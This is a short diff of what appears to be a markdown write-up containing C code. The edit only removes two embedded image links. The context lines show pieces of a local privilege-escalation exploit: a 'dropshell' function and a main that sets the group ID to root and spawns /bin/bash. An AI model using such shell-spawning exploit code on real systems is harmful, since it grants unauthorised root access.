@@ -3130,7 +3130,7 @@ void dropshell(void){
     printf("[+] done!\n");
 }
 
-![image](https://github.com/user-attachments/assets/fefe5aa7-bb45-43c7-a4aa-61551504bfec)
+
 
 ````
 ````
@@ -3161,7 +3161,6 @@ int main(void){
     setegid(0);
     system("/bin/bash");
 }
-![image](https://github.com/user-attachments/assets/8ceb7a63-b014-4adb-ba62-367eee49b8c2)
 
 ````
 ````
